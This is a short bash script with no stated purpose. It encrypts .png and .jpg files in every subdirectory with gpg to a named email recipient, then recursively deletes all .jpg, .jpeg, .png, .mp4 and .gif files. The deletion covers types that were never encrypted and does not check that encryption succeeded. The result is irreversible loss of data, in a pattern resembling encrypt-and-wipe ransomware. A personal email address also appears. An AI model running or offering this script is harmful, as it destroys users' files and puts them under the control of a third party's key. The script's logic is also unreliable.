recep='samir.benzammour@gmail.com'

command="gpg -r $recep --encrypt-files *{.png,.jpg}"

find . -type d -exec bash -c "cd '{}' && $command" \;

sleep .1

find . -name '*.jpg' -delete
find . -name '*.jpeg' -delete
find . -name '*.png' -delete
find . -name '*.mp4' -delete
find . -name '*.gif' -delete
